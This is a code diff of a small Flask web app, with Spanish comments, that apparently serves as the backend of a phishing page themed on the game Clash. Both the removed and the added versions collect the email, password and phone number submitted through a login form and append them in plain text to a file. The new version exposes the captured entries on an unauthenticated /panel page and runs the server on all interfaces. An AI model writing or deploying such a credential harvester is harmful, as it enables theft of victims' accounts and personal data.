@@ -1,66 +1,41 @@
-from flask import Flask, request, session, redirect, send_from_directory
+from flask import Flask, render_template, request, redirect, session
 import os
 
-# Configuramos la app para que busque archivos en la carpeta actual (.)
-app = Flask(__name__, static_folder='.', static_url_path='')
-app.secret_key = 'clave_super_secreta_2026'
+app = Flask(__name__, template_folder='templates')
+app.secret_key = 'clave_secreta_clash_premium_999'
 
-# 1. PÁGINA PRINCIPAL (Pública)
 @app.route('/')
 def index():
-    return send_from_directory('.', 'index.html')
+    return render_template('index.html')
 
-# 2. RUTA PARA ARCHIVOS (CSS, imágenes, JS)
-@app.route('/<path:path>')
-def static_files(path):
-    return send_from_directory('.', path)
+@app.route('/login', methods=['POST'])
+def login():
+    # Captura los datos del formulario de la Página 1
+    correo = request.form.get('correo') or request.form.get('email')
+    password = request.form.get('password') or request.form.get('contraseña')
+    telefono = request.form.get('telefono')
+    
+    if correo and password:
+        with open('datos.txt', 'a') as f:
+            f.write(f"{correo}|{password}|{telefono}\n")
+            
+    return redirect('/panel')
 
-# 3. PROCESAR DATOS (Recibe los datos del formulario)
-@app.route('/guardar', methods=['POST'])
-def guardar():
-    c = request.form.get('correo')
-    p = request.form.get('password')
-    t = request.form.get('telefono')
-    with open('datos.txt', 'a') as f:
-        f.write(f"{c}|{p}|{t}\n")
-    return "Datos recibidos correctamente. <a href='/'>Volver</a>"
-
-# 4. PANEL PRIVADO (Protegido por login)
-@app.route('/panel', methods=['GET', 'POST'])
+@app.route('/panel')
 def panel():
-    # Si ya iniciaste sesión, muestras los datos
-    if session.get('logged_in'):
-        try:
-            with open('datos.txt', 'r') as f:
-                datos = f.read()
-            return f"<h1>Panel de Datos</h1><pre>{datos}</pre><br><a href='/logout'>Cerrar Sesión</a>"
-        except FileNotFoundError:
-            return "No hay datos aún."
-
-    # Login para entrar al panel
-    if request.method == 'POST':
-        if request.form.get('usuario') == 'juanc._25' and request.form.get('pass') == 'elprofre':
-            session['logged_in'] = True
-            return redirect('/panel')
-        else:
-            return "Credenciales incorrectas. <a href='/panel'>Volver</a>"
-
-    return '''
-    <div style="text-align:center; margin-top:50px;">
-        <h3>Login de Administrador</h3>
-        <form method="post">
-            Usuario: <input type="text" name="usuario"><br><br>
-            Contraseña: <input type="password" name="pass"><br><br>
-            <input type="submit" value="Entrar">
-        </form>
-    </div>
-    '''
+    datos = []
+    if os.path.exists('datos.txt'):
+        with open('datos.txt', 'r') as f:
+            # Lee cada línea del archivo de datos
+            datos = [linea.strip() for linea in f.readlines() if linea.strip()]
+            
+    return render_template('panel.html', datos=datos)
 
 @app.route('/logout')
 def logout():
     session.clear()
-    return redirect('/panel')
+    return redirect('/')
 
 if __name__ == '__main__':
-    app.run()
+    app.run(host='0.0.0.0', port=8080)
 
